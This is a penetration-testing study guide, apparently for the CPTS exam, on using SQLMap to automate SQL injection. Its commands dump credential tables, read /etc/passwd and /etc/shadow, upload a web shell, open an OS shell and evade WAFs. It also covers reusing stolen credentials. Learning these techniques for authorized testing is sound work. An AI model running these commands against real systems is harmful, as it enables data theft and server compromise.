# 16 — SQLMap — Automated SQL Injection

SQLMap automates the entire SQL injection process — detection, exploitation, and data extraction. The CPTS path dedicates a full module to it because the exam expects you to use it efficiently. Manual SQLi is important for understanding, but SQLMap is faster for extraction once you've confirmed injection exists.

---

## What SQLMap Does

SQLMap takes a URL or request file, tests every parameter for SQL injection, identifies the injection type and database, then extracts whatever you want — databases, tables, columns, data, files, or even OS command execution.

```
Manual SQLi workflow:
  1. Find the injectable parameter (20 minutes)
  2. Determine column count (5 minutes)
  3. Find displayable columns (5 minutes)
  4. Extract database name (2 minutes)
  5. List tables (2 minutes)
  6. List columns per table (2 minutes per table)
  7. Dump data (2 minutes per table)
  Total: 40+ minutes of careful manual work

SQLMap workflow:
  1. Point SQLMap at the URL
  2. Wait
  3. All data extracted automatically
  Total: 5-10 minutes
```

---

## Basic Usage

### GET parameter injection

```bash
sqlmap -u "http://TARGET/page.php?id=1" --batch
```

**Breaking this down:**

```
sqlmap              The tool
-u "URL"            The target URL with the parameter to test
                    SQLMap tests the "id" parameter for injection
--batch             Don't ask questions — use default answers for everything
                    Without this, SQLMap asks "do you want to test this?" dozens of times
```

**What SQLMap does internally:**

```
1. Sends the normal request (id=1) and records the response
2. Sends id=1' and checks if the response changes (error-based detection)
3. Sends id=1 AND 1=1 and id=1 AND 1=2 (boolean-based detection)
4. Sends id=1; WAITFOR DELAY '0:0:5' (time-based detection)
5. Sends id=1 UNION SELECT NULL,NULL,NULL (UNION-based detection)
6. Tries each technique for each database type (MySQL, MSSQL, PostgreSQL, etc.)
7. Reports which injection types work and which database is in use
```

### POST parameter injection

```bash
sqlmap -u "http://TARGET/login.php" --data "user=admin&pass=test" --batch
```

```
--data "user=admin&pass=test"    Sends a POST request with this body
                                  SQLMap tests BOTH "user" and "pass" for injection
```

### Test a specific parameter only

```bash
sqlmap -u "http://TARGET/page.php?id=1&category=electronics" -p id --batch
```

```
-p id       Only test the "id" parameter (skip "category")
            Faster when you already know which parameter is injectable
```

### From a Burp Suite saved request

This is the most reliable method — captures all headers, cookies, and the exact request format:

```bash
# In Burp Suite:
# 1. Right-click the request in HTTP history
# 2. Save item → save as request.txt

# Then:
sqlmap -r request.txt --batch
```

**What `-r` does:** Reads the full HTTP request from a file — method, URL, headers, cookies, POST body, everything. SQLMap sends the exact same request with injection payloads. This avoids issues with cookies, CSRF tokens, and authentication that break when you use `-u`.

**This is the recommended approach for the CPTS exam.** Capture the request in Burp, save it, feed it to SQLMap.

---

## Extracting Data

Once SQLMap confirms injection, extract data step by step:

### Step 1: List databases

```bash
sqlmap -r request.txt --batch --dbs
```

```
--dbs       List all databases on the server
```

**Output:**

```
available databases [3]:
[*] information_schema
[*] mysql
[*] shop
```

### Step 2: List tables in a database

```bash
sqlmap -r request.txt --batch -D shop --tables
```

```
-D shop        Target the "shop" database
--tables       List all tables in that database
```

**Output:**

```
Database: shop
[3 tables]
+-----------+
| products  |
| users     |
| secret    |
+-----------+
```

### Step 3: List columns in a table

```bash
sqlmap -r request.txt --batch -D shop -T users --columns
```

```
-T users       Target the "users" table
--columns      List all columns in that table
```

**Output:**

```
Table: users
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int         |
| username | varchar(50) |
| password | varchar(100)|
| role     | varchar(20) |
+----------+-------------+
```

### Step 4: Dump the data

```bash
# Dump specific columns
sqlmap -r request.txt --batch -D shop -T users -C username,password --dump

# Dump the entire table
sqlmap -r request.txt --batch -D shop -T users --dump

# Dump ALL tables in ALL databases (takes a long time)
sqlmap -r request.txt --batch --dump-all
```

```
-C username,password   Only dump these columns (faster)
--dump                 Extract the actual data
```

**Output:**

```
+----------+--------------+
| username | password     |
+----------+--------------+
| admin    | Adm1nP@ss!   |
| manager  | Manag3r!     |
| dev      | DevTest123   |
+----------+--------------+
```

---

## Advanced Features

### Read files from the server

```bash
sqlmap -r request.txt --batch --file-read="/etc/passwd"
```

**What this does:** Uses SQL injection to read files from the server's filesystem. Works when the database user has FILE privileges (MySQL) or similar capabilities. The file contents are saved locally.

```bash
sqlmap -r request.txt --batch --file-read="/var/www/html/config.php"
sqlmap -r request.txt --batch --file-read="/etc/shadow"
```

### Write files to the server

```bash
sqlmap -r request.txt --batch --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**What this does:** Writes a local file to the remote server through SQL injection. You can upload a web shell this way. Requires FILE privileges and write access to the web directory.

### OS command execution

```bash
sqlmap -r request.txt --batch --os-cmd="whoami"
```

**What this does:** Attempts to execute an OS command through the SQL injection. SQLMap tries multiple techniques:
- MySQL: `sys_exec()`, `UDF` (User Defined Function)
- MSSQL: `xp_cmdshell`
- PostgreSQL: `COPY TO PROGRAM`

```bash
# Get a full interactive shell
sqlmap -r request.txt --batch --os-shell
```

### Password cracking

When SQLMap dumps password hashes, it offers to crack them:

```bash
sqlmap -r request.txt --batch -D shop -T users --dump
# SQLMap asks: "do you want to crack them via a dictionary attack?"
# With --batch, it automatically tries using its default wordlist

# Use a specific wordlist
sqlmap -r request.txt --batch -D shop -T users --dump --passwords --threads=10
```

---

## Handling Authentication and Sessions

### With cookies

```bash
sqlmap -u "http://TARGET/page.php?id=1" --cookie="PHPSESSID=abc123" --batch
```

### With custom headers

```bash
sqlmap -u "http://TARGET/api?id=1" -H "Authorization: Bearer TOKEN" --batch
```

### With a specific User-Agent

```bash
sqlmap -u "http://TARGET/page.php?id=1" --random-agent --batch
# --random-agent uses a random browser User-Agent string
# Some WAFs block SQLMap's default User-Agent
```

---

## Speed and Stealth Options

```bash
# Increase threads (faster but noisier)
sqlmap -r request.txt --batch --threads=10

# Set risk and level
sqlmap -r request.txt --batch --level=5 --risk=3
```

**What level and risk do:**

```
--level (1-5):
  1 = test only GET/POST parameters (default)
  2 = also test Cookie values
  3 = also test User-Agent and Referer headers
  4 = test more payloads per parameter
  5 = test everything possible (slowest, most thorough)

--risk (1-3):
  1 = only safe payloads (default)
  2 = add time-based blind payloads (can cause delays)
  3 = add OR-based payloads (can modify data — use carefully)
```

**For the CPTS exam:** Start with defaults. If injection isn't found, try `--level=3 --risk=2`. Only use `--level=5 --risk=3` as a last resort.

```bash
# Specify the database type (faster — skips testing for other databases)
sqlmap -r request.txt --batch --dbms=mysql
sqlmap -r request.txt --batch --dbms=mssql
sqlmap -r request.txt --batch --dbms=postgresql
```

---

## SQLMap Flags Reference

| Flag | What it does |
|---|---|
| `-u "URL"` | Target URL with parameter |
| `-r file.txt` | Read request from file (from Burp) |
| `--data "body"` | POST request body |
| `-p param` | Test only this parameter |
| `--batch` | Auto-answer all prompts |
| `--dbs` | List databases |
| `-D dbname --tables` | List tables in database |
| `-T table --columns` | List columns in table |
| `-C col1,col2 --dump` | Dump specific columns |
| `--dump` | Dump table data |
| `--dump-all` | Dump everything |
| `--file-read="path"` | Read a file from the server |
| `--file-write="local" --file-dest="remote"` | Write file to server |
| `--os-cmd="cmd"` | Execute OS command |
| `--os-shell` | Interactive OS shell |
| `--cookie="cookie"` | Set cookie |
| `-H "Header: value"` | Set custom header |
| `--random-agent` | Random User-Agent |
| `--level=N` | Test thoroughness (1-5) |
| `--risk=N` | Payload aggressiveness (1-3) |
| `--threads=N` | Parallel threads |
| `--dbms=type` | Specify database type |
| `--technique=BEUSTQ` | Specify injection techniques |
| `--proxy="http://127.0.0.1:8080"` | Route through Burp |
| `--tamper=script` | Use tamper scripts (WAF bypass) |
| `--forms` | Auto-detect and test HTML forms |
| `--crawl=3` | Crawl the site 3 levels deep and test all forms |

---

## Workflow for the CPTS Exam

```
1. Find a web application with input parameters
2. Test manually first (add a single quote — does the app error?)
3. Capture the request in Burp Suite → Save item → request.txt
4. Run: sqlmap -r request.txt --batch --dbs
5. If it finds injection → extract all databases and tables
6. Dump credentials tables → try credentials on other services
7. Try --file-read for config files with more credentials
8. Try --os-shell for command execution (if the DB user has privileges)
9. Document the full SQLi chain for the report
```

**Manual first, SQLMap second:** On the CPTS, understanding the injection manually shows competence in your report. Use SQLMap to speed up extraction after you've proven the vulnerability exists.
